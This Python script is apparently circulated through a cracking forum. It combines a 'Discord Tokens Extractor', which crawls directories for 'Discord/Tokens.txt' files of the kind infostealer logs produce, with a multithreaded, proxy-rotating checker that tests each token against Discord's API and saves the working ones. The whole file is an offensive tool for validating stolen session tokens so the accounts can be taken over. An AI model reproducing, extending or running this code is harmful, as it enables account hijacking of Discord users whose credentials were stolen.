import requests
import os
import tkinter as tk
from tkinter import filedialog
import concurrent.futures
import platform
from concurrent.futures import ThreadPoolExecutor
import colorama
import threading
import shutil
from colorama import Fore, Back, Style, init
import subprocess
import sys
import logging

# Set up logging
logging.basicConfig(filename='requirements-state.log', level=logging.INFO)

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# List of requirements
required_packages = ['requests', 'colorama']

for package in required_packages:
    try:
        # Try to import the package
        dist = __import__(package)
        logging.info("{} is installed".format(dist.__name__))
    except ImportError:
        # If the import fails, the package is not installed and we try to install it
        logging.warning("{} is NOT installed".format(package))
        logging.info("Installing {}...".format(package))
        install(package)

def clear_console():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')
print_lock = threading.Lock()

def check_token(token_path_tuple, proxy=None):
    token = token_path_tuple[0]
    path = token_path_tuple[1] if len(token_path_tuple) > 1 else "No path provided"
    headers = {'Authorization': token}

    proxies = {}
    if proxy:
        if "@" in proxy:
            ip_port, username_password = proxy.split("@")
            username, password = username_password.split(":")
            proxies = {
                "http": f"http://{username}:{password}@{ip_port}",
                "https": f"https://{username}:{password}@{ip_port}",
                "socks4": f"socks4://{username}:{password}@{ip_port}",
                "socks5": f"socks5://{username}:{password}@{ip_port}",
            }
        else:
            proxies = {
                "http": f"http://{proxy}",
                "https": f"https://{proxy}",
                "socks4": f"socks4://{proxy}",
                "socks5": f"socks5://{proxy}",
            }

    response = requests.get('https://discord.com/api/v6/users/@me', headers=headers, proxies=proxies)

    with print_lock:
        if response.status_code == 200:
            print(f"\033[92mLogin was successful. Token: {token}, File: {path}\033[0m")  
            with open('output_success.txt', 'a', encoding='utf-8') as output_file_success:
                output_file_success.write(f'{token}\n')
            return token
        else:
            print("\033[91mLogin was not successful.\033[0m")  
            return None

def discord_login_tool():
    successful_tokens = set()  

    
    root = tk.Tk()
    root.withdraw()

    file_path = filedialog.askopenfilename()

    with open(file_path, 'r') as f:
        tokens_and_paths = [line.strip().split() for line in f]

    use_proxies = input("Do you want to use proxies? (yes/no): ")
    proxies = []
    if use_proxies.lower() == "yes":
        proxy_file_path = filedialog.askopenfilename()
        with open(proxy_file_path, 'r') as f:
            proxies = [line.strip() for line in f]

    num_threads = int(input("\033[93mEnter the number of threads you want to use: \033[0m"))

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        if proxies:
            results = executor.map(check_token, tokens_and_paths, proxies)
        else:
            results = executor.map(check_token, tokens_and_paths)

    for result in results:
        if result is not None:
            successful_tokens.add(result)  

    return successful_tokens


def discord_token_extractor():
    processed_tokens = set() 

    # extract tokens
    def extract_data(file_path, original_folder):
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    tokens = file.readlines()
                    for token in tokens:
                        token = token.strip()
                        if token and token not in processed_tokens:
                            processed_tokens.add(token)  
                            with open('output_with_dir.txt', 'a', encoding='utf-8') as output_file_with_dir:
                                output_file_with_dir.write(f'{token} {file_path}\n')  
                            with open('output_without_dir.txt', 'a', encoding='utf-8') as output_file_without_dir:
                                output_file_without_dir.write(f'{token}\n')
                            print("\033[92m Please Wait \033[0m", end="", flush=True)  
                            print(colorama.Fore.MAGENTA + '''
________________________________█████_____█████
______________________________███____██_██_____███
_____________________________██________██__________██
____________________________██__________█____________██
________██████____________██_______With Love_________██
_____███████████________██__________By______________██
____█████████████_______██_Crcked.io/Ddarknotevil██
___███████████████______██______________________██
___████████████████______██___________________██
___████████████████_______██_________________██
____███████████████_______███_______________██
_______███████████_______██__██_____________██
___________███████______████___██__________██
____██████__██████████████_____██____    _██
__██████████████████████________██_██_███ ██
_████████████████████_____________████████
██_█████_████████████_______________
█__█_██__████████████
_____█__████████████               
_______█████████████                           Drink Coffee..
_______██████████████                                       
_______███████████████                                                         
________███████████████                                        
_______███████__████████                                        
______███████_____███████                                   
____█████████________██████

    ''' + colorama.Style.RESET_ALL)
            except UnicodeDecodeError:
                pass

    def traverse_dir(dir_path, num_threads):
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            for foldername, subfolders, filenames in os.walk(dir_path):
                if 'Discord' in subfolders:
                    discord_folder = os.path.join(foldername, 'Discord')
                    for filename in os.listdir(discord_folder):
                        if filename == 'Tokens.txt':
                            file_path = os.path.join(discord_folder, filename)
                            executor.submit(extract_data, file_path, foldername)

    start_dir = os.getcwd()

    num_threads = int(input("\033[93mEnter the number of threads you want to use: \033[0m"))

    traverse_dir(start_dir, num_threads)

# Main function
def main():
    successful_tokens = set()  
    while True:
        clear_console()
        init()
        columns, rows = shutil.get_terminal_size()
        print(Fore.MAGENTA + '\n' * (rows // 2 - 6))
        print(' ' * (columns // 2 - 20) + '+' + '-' * 40 + '+')
        print(' ' * (columns // 2 - 20) + "| Please select a tool:                  |")
        print(' ' * (columns // 2 - 20) + "|                                        |")
        print(' ' * (columns // 2 - 20) + "| \033[1m\033[92m 1 (Tokens Checker)- Discord Login Tool\033[0m       ")
        print(' ' * (columns // 2 - 20) + "|                                          ")
        print(' ' * (columns // 2 - 20) + "| \033[1m\033[92m 2 (Folders Extractor)- Discord Tokens Extractor\033[0m ")
        print(' ' * (columns // 2 - 20) + "|                                          ")
        print(' ' * (columns // 2 - 20) + "| \033[1m\033[91m 3. Exit\033[0m                                ")
        print(' ' * (columns // 2 - 20) + '+' + '-' * 40 + '+' + Style.RESET_ALL)
        choice = input("Enter your choice: ")
        if choice == "1":
            successful_tokens = discord_login_tool()
        elif choice == "2":
            discord_token_extractor()
        elif choice == "3":
            break
        else:
            print("Invalid choice. Please try again.")
        input("Press Enter to continue...")
if __name__ == "__main__":
    main()